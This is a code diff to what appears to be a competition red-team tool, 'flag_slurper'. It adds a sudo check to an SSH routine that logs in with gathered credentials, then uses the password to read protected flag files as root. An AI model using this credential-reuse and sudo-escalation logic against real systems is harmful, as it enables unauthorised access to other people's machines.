@@ -6,7 +6,7 @@ import requests
 import paramiko
 
 from flag_slurper.autolib.exploit import get_file_contents, get_system_info
-from .exploit import find_flags, FlagConf
+from .exploit import find_flags, FlagConf, can_sudo
 from .models import Service, CredentialBag, Credential, Flag, CaptureNote
 
 logger = logging.getLogger(__name__)
@@ -37,17 +37,28 @@ def pwn_ssh(url: str, port: int, service: Service, flag_conf: FlagConf) -> Tuple
                 ssh.connect(url, port=port, username=credential.username, password=credential.password,
                             look_for_keys=False, allow_agent=False)
                 cred.state = Credential.WORKS
+
+                # Root doesn't need sudo
+                sudo = False
+                if credential.username != "root":
+                    sudo = can_sudo(ssh, credential.password)
+                    if sudo:
+                        cred.sudo = True
+
                 cred.save()
                 working.add(cred)
 
                 sysinfo = get_system_info(ssh)
+                if sudo:
+                    sysinfo += "\nUsed Sudo"
 
                 flag_obj, _ = Flag.get_or_create(team=service.team, name=flag_conf['name'])
 
                 if flag_conf:
                     location = flag_conf['name']
                     full_location = os.path.join(base_dir, location)
-                    flag = get_file_contents(ssh, full_location)
+                    sudo_cred = credential.password if sudo else None
+                    flag = get_file_contents(ssh, full_location, sudo=sudo_cred)
                     if flag:
                         enable_search = False
                         note, created = CaptureNote.get_or_create(flag=flag_obj, data=flag, location=full_location,
@@ -58,8 +69,10 @@ def pwn_ssh(url: str, port: int, service: Service, flag_conf: FlagConf) -> Tuple
                     for flag in flags:
                         CaptureNote.get_or_create(flag=flag_obj, data=flag[1], location=flag[0], notes=str(sysinfo),
                                                   searched=True, service=service)
-        except Exception:
+        except paramiko.ssh_exception.AuthenticationException:
             continue
+        except Exception:
+            logger.exception("There was an error pwning this service: %s", url)
 
     if working:
         return "Found credentials: {}".format(working), True, False
